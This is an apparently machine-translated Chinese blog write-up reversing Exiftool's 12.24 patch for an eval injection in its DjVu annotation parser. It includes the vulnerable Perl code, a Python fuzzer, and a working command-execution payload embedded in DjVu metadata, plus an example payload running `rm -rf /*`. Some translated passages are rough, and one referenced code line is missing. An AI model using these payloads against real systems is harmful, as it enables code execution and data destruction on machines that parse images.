错误


在4月24日凌晨，推文显示了Exiftool在简单图像上运行如何导致任意代码执行。这引起了我的兴趣，因为 Exiftool 不仅在 CTF 挑战中非常常见，而且还用于需要显示 Exif 数据的大量软件中。


该漏洞利用的概念证明代码尚未公开，因此我着手撤消该安全补丁并找到一种利用该漏洞的方法。


检查补丁


让我们从修补版本（12.24）的发行说明开始。我们将准确找到有关此版本中已修复的安全问题的条目。

Apr. 13, 2021 - Version 12.24 [...]  - Patched security vulnerability in DjVu reader [...]

有了这些信息，我们可以检查版本12.23和版本12.24之间的git diff。更具体地说，让我们看一下对lib/Image/Exiftool/DjVu.pm处理DjVu数据的Perl模块的更改。

  • 有一个可怕的eval注射。

  • 该错误位于函数中的这两行代码中ParseAnt。


但是，在我们深入研究补丁之前，DjVu文件还算什么？DjVu是一种文档格式，有点类似于PDF。它不是很常用，但它有许多不同的注释和元数据字段，Exiftool 可以解析它们。


创建 DjVu 文件


要创建 DjVu 文件，我们将在 Linux 上使用 DjVu Libre 套件。文件的内容并不重要，我们只关心附加的元数据。


首先，我们创建一个包含以下内容的文本文件：

(metadata  (note "Hello World!"))

然后使用文本文件作为注释数据，制作一个新的空DjVu文件：

djvumake test.djvu INFO=0,0 BGjp=/dev/null ANTa=annotation-file.txt

当我们现在用 Exiftool 解析这个文件时，我们会看到“Hello World!” 在输出中注意。


走幸福之路


在我们尝试提供 Exiftool 无效数据之前，让我们弄清楚如何解析这些元数据。


该DjVu.pm模块首先使用以下代码段检查文件中是否有任何注释：

sub ProcessAnt($$$){    # ... < snip > ...    # quick pre-scan to check for metadata or XMP    return 1 unless $$dataPt =~ /\(\s*(metadata|xmp)[\s("]/s;
    # parse annotations into a tree structure    pos($$dataPt) = 0;    my $toks = ParseAnt($dataPt) or return 0;    # ... < snip > ...}

只要我们的注释文件以(xmp 或开头(metadata ，我们就会到达易受攻击的ParseAnt 函数。此函数将提取单个“令牌”，并返回元数据。

漏洞

评估

由于我们知道更改的确切内容，因此很容易确定漏洞。一旦ParseAnt在双引号中找到一个字符串（保存在 中$tok），它就会执行以下代码行：

# must protect unescaped "$" and "@" symbols, and "\" at end of string$tok =~ s{\\(.)|([\$\@]|\\$)}{'\\'.($2 || $1)}sge;# convert C escape sequences (allowed in quoted text)$tok = eval qq{"$tok"};

所述qq操作者增加了额外的一组引号，导致被包括在内的报价eval。这怎么可能被利用？好吧，如果$tok可以包含引号，那么攻击者可能会将以下有效负载传递给eval：

# $tok = '" . `rm -rf  /*` ."'$tok = eval qq{"" . `rm -rf  /*` . ""};

这将rm -rf /*用两个空字符串连接（。）的输出。对我们来说可悲的是，$tok过滤器试图阻止这种攻击，所以我们不能简单地加上引号。


过滤器旁路

我们需要找到一种方法来将引用走私到eval语句中而不会被转义。以下代码段负责查找要传递给的子字符串eval。如果您不太熟悉Perl，可能很难读懂，但是基本思想如下：


  1. 循环播放所有字符。

  2. 如果找到双引号，则开始构建子字符串。

  3. 在子字符串的下一个非转义双引号处将其终止eval。

Tok: for (;;) {    # find the next token    last unless $$dataPt =~ /(\S)/sg;   # get next non-space character    if ($1 eq '(') {       # start of list        # ... < snip > ...    } elsif ($1 eq '"') {  # quoted string        $tok = '';        for (;;) {            # get string up to the next quotation mark            my $pos = pos($$dataPt);            last Tok unless $$dataPt =~ /"/sg;            $tok .= substr($$dataPt, $pos, pos($$dataPt)-1-$pos);            # we're good unless quote was escaped by odd number of backslashes            last unless $tok =~ /(\\+)$/ and length($1) & 0x01;            $tok .= '"';    # quote is part of the string        }        # must protect unescaped "$" and "@" symbols, and "\" at end of string        $tok =~ s{\\(.)|([\$\@]|\\$)}{'\\'.($2 || $1)}sge;        # convert C escape sequences (allowed in quoted text)        $tok = eval qq{"$tok"};    } else {        # ... <snip> ...    }    # ... <snip> ...}

如果您熟悉 Perl，您也许能够直接发现错误。作为Perl新手，我很难手动找到过滤器旁路。相反，我制作了一个简单的Python模糊测试程序来查找转义符。


我们可以做一个 fuzzer pop calc 吗？

首先，让我们什么我们的有效载荷原因必须样子。我们知道它必须首先(xmp "触发eval我们感兴趣的代码。除此之外，我们需要在中间添加某种有效负载，并在其后添加一些其他转义字符。


有了这些信息，我们可以构建以下模板字符串：

TEMPLATE = r"(xmp \"{}`mate-calc`{}"

接下来，我们创建一些辅助函数来创建 DjVu 文件并使用 Exiftool 对其进行解析。

def get_data():    k1 = random.randint(0, 10)    k2 = random.randint(0, 10)    # Special characters that may hit edge cases.    alph  = "\\\".+*\n"    # Pick some random characters to insert into our template.    before = ''.join(random.choices(alph, k=k1))    after  = ''.join(random.choices(alph, k=k2))    return TEMPLATE.format(before, after).encode()
def do_fuzz_case():    # Create an annotation file    with open("fuzz-annotation.txt", "wb") as ant_file:        data = get_data()        ant_file.write(data)    # Embed it in a new DjVu file    p = Popen(["djvumake", "fuzz.djvu", "INFO=0,0", "BGjp=/dev/null",                "ANTa=fuzz-annotation.txt"])    try:  # djvumake would sometimes get stuck, so I added a small timeout.        p.communicate(timeout=0.8)    except:        return False    # Parse the DjVu file with Exiftool    p = Popen(["./exiftool/exiftool", "fuzz.djvu"], stdout=PIPE, stderr=PIPE)    stdout, stderr = p.communicate()    # If Exiftool returned a warning, print the fuzz case that caused it.    if stderr:        print(f">>>{data}<<<", stderr)

现在剩下的就是一遍又一遍地调用此函数，直到获得有趣的输出。这个模糊器不是非常复杂2，每秒只会产生几个执行程序。尽管如此，它会在几分钟内开始产生有趣的错误：

>>>b'(xmp \\"\\\n"\\*"\\"."`mate-calc`\\\n'<<< b'Backslash found where operator expected at (eval 8) line 2, near ""\\\n"\\"\n\t(Missing operator before \\?)\n'
>>>b'(xmp \\"\\\n"+*\\*\n`mate-calc`"""\n\\?"."'<<< b'String found where operator expected at (eval 8) line 3, at end of line\n\t(Missing semicolon on previous line?)\n'
>>>b'(xmp \\"+\\"\\\n"*\\""`mate-calc`"+*+"..'<<< b'Argument "+"\\n" isn\'t numeric in multiplication (*) at (eval 8) line 1.\n'

在我看来，最后一次崩溃是最容易理解的，最终对我重新创建漏洞利用帮助最大，所以它似乎是一个很好的起点。最小化崩溃文件后，我们得到以下注释数据：

(xmp "\"*\""
Argument "\n" isn't numeric in multiplication (*) at (eval 8) line 1.

警告告诉我们，我们eval试图将换行符与something相乘。这看起来很有希望！如果我们能做乘法，我们就突破了双引号，可以执行 Perl 代码了。

现在我们需要做的就是用字符串连接替换乘法并执行一个 shell 命令：

(xmp "\" . `mate-calc` . \""

那么，这种旁路是如何工作的呢？

绕过依赖于以下行，该行确定在何处“削减”令牌：


正则表达式用于检查当前子字符串是否以奇数个反斜杠结尾。如果是这样，则假定刚刚找到的引号已被正确转义，并且应该是元数据的一部分。


当引号前的最后两个字符为反斜杠和换行符时，此逻辑将失效。正则表达式将看到\\n并“认为”它匹配\。即使反斜杠实际上转义了换行符而不是引号，这也会导致引号包含在子字符串中。


此时，我们已经脱离了字符串上下文，可以开始执行任意 Perl 代码了。最后，我们需要以一个转义的引号结束我们的有效负载，然后是一个真实的引号以结束此令牌。
